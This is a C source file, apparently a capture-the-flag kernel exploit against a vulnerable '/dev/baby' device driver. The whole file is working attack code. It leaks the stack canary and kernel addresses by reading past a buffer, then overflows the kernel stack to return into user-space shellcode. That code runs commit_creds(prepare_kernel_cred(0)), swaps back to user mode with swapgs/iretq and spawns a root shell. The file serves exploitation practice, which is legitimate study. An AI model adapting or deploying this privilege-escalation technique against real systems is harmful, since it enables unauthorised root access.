#define _GNU_SOURCE
#include <stdio.h>
#include <sys/types.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <signal.h>

int global_fd;
unsigned long cookie, stack_addr;
unsigned long commit_creds_addr, prepare_kernel_cred_addr;
unsigned long user_cs, user_ss, user_rflags, user_sp;

void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[*] Saved state");
}

void open_dev(){
    global_fd = open("/dev/baby", O_RDWR);
	if (global_fd < 0){
		puts("[!] Failed to open device");
		exit(-1);
	} else {
        puts("[*] Opened device");
    }
}

void print_leak(unsigned long *leak, unsigned n) {
    for (unsigned i = 49; i < n; ++i) {
        printf("%u: %lx\n", i, leak[i]);
    }
}

void leak(void){
    unsigned n = 55;
    unsigned long leak[n];
    ssize_t r = read(global_fd, leak, sizeof(leak));
    cookie = leak[50];
    stack_addr = leak[51];

    // Obtain addresses from leak
    commit_creds_addr = stack_addr - 1329031;
    prepare_kernel_cred_addr = stack_addr - 1328471;

    printf("[*] Leaked %zd bytes\n", r);
    printf("[*] Cookie: %lx\n", cookie);
    printf("[*] Stack leak: %lx\n", stack_addr);
    printf("[*] commit_creds: %lx\n", commit_creds_addr);
    printf("[*] prepare_kernel_cred: %lx\n", prepare_kernel_cred_addr);

    print_leak(leak, n);
}

void get_shell(void){
    puts("[*] Returned to userland");
    if (getuid() == 0){
        printf("[*] UID: %d, got root!\n", getuid());
        system("/bin/sh");
    } else {
        printf("[!] UID: %d, didn't get root\n", getuid());
        exit(-1);
    }
}

unsigned long user_rip = (unsigned long)get_shell;

void escalate_privs(void){
    // Call commit_creds(prepare_kernel_cred(0))
    __asm__(
        ".intel_syntax noprefix;"
        "movabs rax, prepare_kernel_cred_addr;" //prepare_kernel_cred
        "xor rdi, rdi;"
	    "call rax; mov rdi, rax;"
	    "movabs rax, commit_creds_addr;" //commit_creds
	    "call rax;"
        "swapgs;"
        "mov r15, user_ss;"
        "push r15;"
        "mov r15, user_sp;"
        "push r15;"
        "mov r15, user_rflags;"
        "push r15;"
        "mov r15, user_cs;"
        "push r15;"
        "mov r15, user_rip;"
        "push r15;"
        "iretq;"
        ".att_syntax;"
    );
}


void overflow(void){
    unsigned n = 60;
    unsigned long payload[n];
    unsigned off = 50;
    payload[off++] = cookie;
    //payload[off++] = 0x0; // rbx
    //payload[off++] = 0x0; // r12
    //payload[off++] = 0xdeadbeef; // rbp
    payload[off++] = (unsigned long)escalate_privs; // ret

    puts("[*] Prepared payload");
    ssize_t w = write(global_fd, payload, sizeof(payload));

    puts("[!] Should never be reached");
}


int main() {
    save_state();
    open_dev();
    leak();
    signal(SIGSEGV, get_shell);
    overflow();  
    puts("[!] Should never be reached");
    return 0;
}

